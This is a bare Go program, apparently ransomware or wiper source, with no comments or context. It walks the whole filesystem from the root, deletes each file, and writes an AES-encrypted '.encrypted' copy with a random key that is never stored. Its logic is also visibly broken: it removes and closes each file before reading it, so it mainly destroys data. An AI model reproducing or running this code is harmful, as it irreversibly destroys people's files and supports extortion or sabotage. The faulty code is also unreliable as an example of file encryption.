package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
)

func main() {
	root := "\\"
	filepath.WalkDir(root, visitFile)
}

func visitFile(path string, info os.DirEntry, err error) error {
	if err != nil {
		fmt.Printf("%v\n", err)
		return nil
	}
	if info.IsDir() {
		return nil
	}
	encryptFile(path)
	return nil
}

func encryptFile(path string) {
	fmt.Println(path)

	_, err2 := os.Stat(path)

	if err2 != nil {
		return
	}

	if strings.Contains(path, "Documents and Settings") {
		return
	}

	file, err := os.Open(path)

	if err != nil {
		log.Fatal(err)
		return
	}
	err = os.Remove(path)
	if err != nil {
		return
	}

	err = file.Close()

	if err != nil {
		return
	}

	key := make([]byte, 32)
	_, err = rand.Read(key)
	if err != nil {
		log.Fatal(err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatal(err)
	}

	iv := make([]byte, aes.BlockSize)
	_, err = rand.Read(iv)
	if err != nil {
		log.Fatal(err)
	}

	ciphertextFile, err := os.Create(path + ".encrypted")
	if err != nil {
		log.Fatal(err)
	}
	defer ciphertextFile.Close()

	_, err = ciphertextFile.Write(iv)
	if err != nil {
		log.Fatal(err)
	}

	ciphertext := cipher.NewCBCEncrypter(block, iv)

	plaintext := make([]byte, aes.BlockSize)
	buffer := make([]byte, aes.BlockSize)
	for {
		_, err := file.Read(plaintext)
		if err == io.EOF {
			return
		}
		ciphertext.CryptBlocks(buffer, plaintext)
		_, err = ciphertextFile.Write(buffer)
		if err != nil {
			log.Fatal(err)
		}
	}
}
